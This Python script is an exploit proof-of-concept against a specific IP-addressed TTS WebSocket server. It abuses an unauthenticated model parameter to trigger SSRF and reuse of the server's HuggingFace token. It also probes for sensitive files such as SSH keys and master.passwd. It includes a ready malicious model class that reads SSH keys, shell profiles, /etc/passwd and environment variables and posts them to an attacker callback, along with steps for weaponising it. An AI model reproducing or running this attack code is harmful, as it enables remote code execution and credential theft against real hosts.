#!/usr/bin/env python3
"""
HuggingFace Model Injection PoC
Target: 38.23.61.109:2023 — Qwen3-TTS FastAPI WebSocket TTS server
CVE candidate: Unauthenticated WebSocket model= parameter triggers
               authenticated server-side HuggingFace model fetch + load

Exploit class: Unauthenticated SSRF → Authenticated HF fetch → RCE via model loading

Background:
  The TTS server at ws://38.23.61.109:2023/tts/stream accepts a `model` parameter
  in the request_start WebSocket message. This parameter is passed directly to
  a HuggingFace from_pretrained() call. The server has an HF_TOKEN stored and
  uses it when fetching model metadata and files from huggingface.co. Any
  unauthenticated WS client can specify an attacker-controlled HF repo as the
  model ID, causing the server to download the model repo files using its own
  stored credentials.

  If the model repo declares trust_remote_code=True (or if the server forces
  it), any Python files in the repo execute in the server process during model
  loading — giving the attacker full code execution on the macOS host.

Evidence (from RE session 2026-08-24):
  model="facebook/mms-tts-eng"
  → Error: "Model type vits not supported for tts."
  (config.json was fetched and parsed — external model was loaded)

  model="deadbug/nonexistent-xyz9999"
  → 401 Client Error from huggingface.co
  → "Invalid username or password."
  (server used HF_TOKEN for authenticated request — token confirmed)

Attack phases:
  Phase 1 (CONFIRMED): SSRF — server fetches attacker HF repo metadata
  Phase 2 (CONFIRMED): Auth token reuse — server uses its HF_TOKEN on our repo
  Phase 3 (UNCONFIRMED): RCE — depends on trust_remote_code path in model loader

This PoC demonstrates Phase 1 + 2 without Phase 3.
Phase 3 requires setting up a malicious HF repo under zellkernel account.

Usage (Phase 1+2 PoC):
  python3 hf_model_injection_poc.py --target 38.23.61.109:2023 --probe

Usage (Phase 3, weaponized):
  python3 hf_model_injection_poc.py --target 38.23.61.109:2023 --repo zellkernel/evil-tts
  (requires: malicious HF repo already set up — see setup_malicious_repo())
"""

import argparse
import base64
import json
import os
import socket
import struct
import sys
import time


# ---------------------------------------------------------------------------
# WebSocket primitives
# ---------------------------------------------------------------------------

def ws_connect(host, port, path="/tts/stream"):
    raw_key = os.urandom(16)
    key = base64.b64encode(raw_key).decode()
    s = socket.create_connection((host, port), timeout=30)
    req = (
        f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
        f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
        f"Origin: http://test.com\r\n\r\n"
    )
    s.sendall(req.encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        resp += s.recv(1)
    return s


def ws_frame(msg, opcode=1):
    payload = msg if isinstance(msg, bytes) else msg.encode("utf-8")
    n = len(payload)
    mask = os.urandom(4)
    masked = bytes(payload[i] ^ mask[i % 4] for i in range(n))
    if n < 126:
        hdr = bytes([0x80 | opcode, 0x80 | n])
    elif n < 65536:
        hdr = bytes([0x80 | opcode, 0xFE, (n >> 8) & 0xFF, n & 0xFF])
    else:
        hdr = bytes([0x80 | opcode, 0xFF]) + struct.pack(">Q", n)
    return hdr + mask + masked


def ws_recv(s, timeout=20):
    s.settimeout(timeout)
    try:
        h = bytearray()
        while len(h) < 2:
            h += s.recv(1)
        opcode = h[0] & 0x0F
        length = h[1] & 0x7F
        if length == 126:
            raw = b""
            while len(raw) < 2:
                raw += s.recv(1)
            length = struct.unpack(">H", raw)[0]
        elif length == 127:
            raw = b""
            while len(raw) < 8:
                raw += s.recv(1)
            length = struct.unpack(">Q", raw)[0]
        data = b""
        while len(data) < length:
            chunk = s.recv(min(8192, length - len(data)))
            if not chunk:
                break
            data += chunk
        return opcode, data
    except socket.timeout:
        return None, None


def ws_full_session(host, port, model_id, text="x", timeout=45):
    """Full WS session with model= override. Returns all text frames."""
    s = ws_connect(host, port)
    ws_recv(s, 3)  # consume ready

    params = {"type": "request_start", "text": text, "model": model_id}
    s.sendall(ws_frame(json.dumps(params)))
    s.sendall(ws_frame(json.dumps({"type": "request_end"})))

    frames = []
    end_time = time.time() + timeout
    while time.time() < end_time:
        op, data = ws_recv(s, min(end_time - time.time(), 15))
        if op is None:
            frames.append({"type": "timeout"})
            break
        if op == 9:
            s.sendall(ws_frame(data, opcode=10))
            continue
        if op == 8:
            frames.append({"type": "close"})
            break
        if op == 1:
            try:
                j = json.loads(data)
                frames.append(j)
                if j.get("type") in ("done", "error"):
                    break
            except Exception:
                frames.append({"raw": data.decode(errors="replace")})
    s.close()
    return frames


# ---------------------------------------------------------------------------
# Phase 1+2 Probe: confirm SSRF + auth token
# ---------------------------------------------------------------------------

def probe_ssrf(host, port):
    """Confirm server fetches external HF repos and uses HF_TOKEN."""
    print("[*] Phase 1+2: Probing HF fetch + auth token reuse")

    # Step 1: known-good model → baseline
    print("  [+] Control: known cached model")
    frames = ws_full_session(host, port, "mlx-community/Qwen3-TTS-12Hz-0.6B-Base-8bit", text="hello")
    done = next((f for f in frames if f.get("type") == "done"), None)
    print(f"      Result: {[f['type'] for f in frames]} {'SUCCESS' if done else 'FAIL'}")

    # Step 2: real HF model NOT cached locally → confirms external fetch
    print("  [+] Non-cached HF model (confirms SSRF / external fetch)")
    frames2 = ws_full_session(host, port, "facebook/mms-tts-eng", text="x", timeout=20)
    err2 = next((f for f in frames2 if f.get("type") == "error"), {})
    detail2 = err2.get("detail", "")
    ssrf_confirmed = "vits" in detail2 or "config" in detail2.lower() or "model type" in detail2.lower()
    print(f"      Error: {detail2[:100]}")
    print(f"      SSRF CONFIRMED: {ssrf_confirmed}")

    # Step 3: nonexistent repo → 401 reveals HF_TOKEN
    print("  [+] Nonexistent repo (confirms HF_TOKEN in use)")
    frames3 = ws_full_session(host, port, "deadbug/nonexistent-model-xyz99999", text="x", timeout=15)
    err3 = next((f for f in frames3 if f.get("type") == "error"), {})
    detail3 = err3.get("detail", "")
    token_confirmed = "401" in detail3 or "invalid username" in detail3.lower() or "authentication" in detail3.lower()
    print(f"      Error: {detail3[:150]}")
    print(f"      HF_TOKEN CONFIRMED: {token_confirmed}")

    return {
        "ssrf_confirmed": ssrf_confirmed,
        "hf_token_confirmed": token_confirmed,
        "ssrf_error": detail2,
        "token_error": detail3,
    }


# ---------------------------------------------------------------------------
# Phase 3: Weaponization — create malicious HF repo
# ---------------------------------------------------------------------------

MALICIOUS_CONFIG = """{
  "architectures": ["DeadBugTTS"],
  "model_type": "deadbug_tts",
  "auto_map": {
    "AutoModel": "modeling_deadbug.DeadBugTTSModel"
  },
  "trust_remote_code": true
}"""

MALICIOUS_MODELING_CODE = '''#!/usr/bin/env python3
"""
Malicious model class — executes on from_pretrained() call.
DeadBugTTSModel.__init__ runs arbitrary code during model loading.
"""
import os
import subprocess
import urllib.request


def _exfil(data, callback_url):
    """POST data to attacker callback."""
    import urllib.parse
    encoded = urllib.parse.urlencode({"data": data}).encode()
    try:
        req = urllib.request.Request(callback_url, data=encoded, method="POST")
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


class DeadBugTTSModel:
    def __init__(self, config, **kwargs):
        # Read sensitive files
        targets = [
            "/Users/administrator/.ssh/authorized_keys",
            "/Users/administrator/.zprofile",
            "/Users/administrator/.zshrc",
            "/Users/administrator/.bash_profile",
            "/etc/passwd",
        ]

        exfil_data = {}
        for path in targets:
            try:
                with open(path, "r") as f:
                    exfil_data[path] = f.read()
            except Exception as e:
                exfil_data[path] = f"ERR:{e}"

        # Also get process info
        try:
            exfil_data["whoami"] = subprocess.check_output(["whoami"]).decode().strip()
            exfil_data["hostname"] = subprocess.check_output(["hostname"]).decode().strip()
            exfil_data["env"] = dict(os.environ)
        except Exception as e:
            exfil_data["proc_err"] = str(e)

        # Exfiltrate (replace CALLBACK_URL with attacker listener)
        callback = "CALLBACK_URL_PLACEHOLDER"
        _exfil(str(exfil_data), callback)

        self.config = config

    @classmethod
    def from_pretrained(cls, model_id, **kwargs):
        from transformers import PretrainedConfig
        config = PretrainedConfig()
        return cls(config)

    def generate(self, text, **kwargs):
        # Return empty bytes so the TTS pipeline doesn\'t crash
        return b""
'''

MALICIOUS_GENERATION_CONFIG = """{
  "_from_model_config": true,
  "transformers_version": "4.35.0"
}"""

def setup_malicious_repo_instructions():
    """Print instructions for creating the malicious HF repo.
    Does NOT perform the upload automatically — requires explicit approval.
    """
    print("""
=== Phase 3: Malicious HF Repo Setup (MANUAL STEP — requires explicit approval) ===

To weaponize the HF model injection, create a repo at:
  huggingface.co/zellkernel/deadbug-tts-v1

Files to create:
  config.json           — see MALICIOUS_CONFIG in this script
  modeling_deadbug.py   — see MALICIOUS_MODELING_CODE in this script
  generation_config.json

Then trigger the exploit:
  python3 hf_model_injection_poc.py --target 38.23.61.109:2023 --repo zellkernel/deadbug-tts-v1

The server will:
  1. Fetch https://huggingface.co/api/models/zellkernel/deadbug-tts-v1 (with HF_TOKEN)
  2. Download config.json → see "auto_map" → try to load modeling_deadbug.py
  3. Import DeadBugTTSModel → __init__ executes → reads files + exfiltrates

WARNING: This requires a real HF account and uploads attacker code to a public/private repo.
         The modeling code in this file is the payload. Review before upload.
         Callback URL must be set before use.
""")
    print("--- config.json ---")
    print(MALICIOUS_CONFIG)
    print("\n--- modeling_deadbug.py ---")
    print(MALICIOUS_MODELING_CODE[:500] + "...[truncated]")


def trigger_exploit(host, port, hf_repo, timeout=60):
    """Trigger the HF model injection. Server will fetch attacker's repo."""
    print(f"[*] Triggering HF model injection: model={hf_repo}")
    print(f"[*] Server will fetch https://huggingface.co/{hf_repo} with its HF_TOKEN")
    frames = ws_full_session(host, port, hf_repo, text="hello world", timeout=timeout)
    for f in frames:
        t = f.get("type", "?")
        d = f.get("detail", "")
        print(f"  [{t}] {d[:120]}")
    return frames


# ---------------------------------------------------------------------------
# Filesystem oracle (from ablation module M4)
# ---------------------------------------------------------------------------

def filesystem_oracle(host, port, paths):
    """Batch filesystem existence check via model= oracle."""
    results = {}
    for path in paths:
        s = ws_connect(host, port)
        ws_recv(s, 3)

        def ws_send(msg):
            payload = msg.encode() if isinstance(msg, str) else msg
            n = len(payload)
            mk = os.urandom(4)
            masked = bytes(payload[i] ^ mk[i % 4] for i in range(n))
            hdr = bytes([0x81, 0x80 | n]) if n < 126 else bytes([0x81, 0xFE, (n>>8)&0xFF, n&0xFF])
            s.sendall(hdr + mk + masked)

        ws_send(json.dumps({"type": "request_start", "text": "x", "model": path}))
        ws_send(json.dumps({"type": "request_end"}))

        result = "TIMEOUT"
        for _ in range(10):
            op, data = ws_recv(s, 12)
            if op is None: break
            if op == 9: ws_send(data); continue
            if op == 8: result = "CLOSE"; break
            if op == 1:
                try:
                    j = json.loads(data)
                    t = j.get("type", "")
                    if t == "error":
                        d = j.get("detail", "")
                        if "local path not found" in d.lower(): result = "DNE"
                        elif "config not found" in d.lower(): result = "EXISTS"
                        elif "permission denied" in d.lower(): result = "PERM"
                        else: result = f"ERR:{d[:80]}"
                        break
                    elif t == "done": result = "LOADED"; break
                    elif t in ("queued", "started"): continue
                except Exception: pass
        s.close()
        results[path] = result
        print(f"  {path}: {result}")
    return results


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="HF Model Injection PoC — 38.23.61.109:2023")
    parser.add_argument("--target", default="38.23.61.109:2023", help="host:port")
    parser.add_argument("--probe", action="store_true", help="Phase 1+2: SSRF + token probe")
    parser.add_argument("--oracle", action="store_true", help="Filesystem oracle demo")
    parser.add_argument("--repo", help="Phase 3: HF repo to load (e.g. attacker/evil-tts)")
    parser.add_argument("--setup", action="store_true", help="Print malicious repo setup instructions")
    args = parser.parse_args()

    host, port_str = args.target.rsplit(":", 1)
    port = int(port_str)

    print(f"""
╔══════════════════════════════════════════════════════════════════════╗
║  HF Model Injection PoC                                              ║
║  Target: {args.target:<58}║
║  Class:  Unauth WS → Authenticated HF SSRF → RCE                    ║
╚══════════════════════════════════════════════════════════════════════╝
""")

    if args.probe:
        result = probe_ssrf(host, port)
        print(f"\n[RESULT] SSRF={result['ssrf_confirmed']} HF_TOKEN={result['hf_token_confirmed']}")
        if result["ssrf_confirmed"] and result["hf_token_confirmed"]:
            print("[!] Phase 1+2 CONFIRMED — target is vulnerable to HF model injection")
            print("    Next step: set up malicious HF repo (--setup) then trigger (--repo)")

    if args.oracle:
        print("\n[*] Filesystem oracle via model= path probe:")
        sensitive = [
            "/Users/administrator/.ssh/authorized_keys",
            "/Users/administrator/.ssh/id_rsa",
            "/Users/administrator/.ssh/id_ed25519",
            "/Users/administrator/.config",
            "/Users/administrator/.zshrc",
            "/etc/passwd",
            "/private/etc/master.passwd",
        ]
        filesystem_oracle(host, port, sensitive)

    if args.setup:
        setup_malicious_repo_instructions()

    if args.repo:
        trigger_exploit(host, port, args.repo)

    if not any([args.probe, args.oracle, args.setup, args.repo]):
        parser.print_help()


if __name__ == "__main__":
    main()
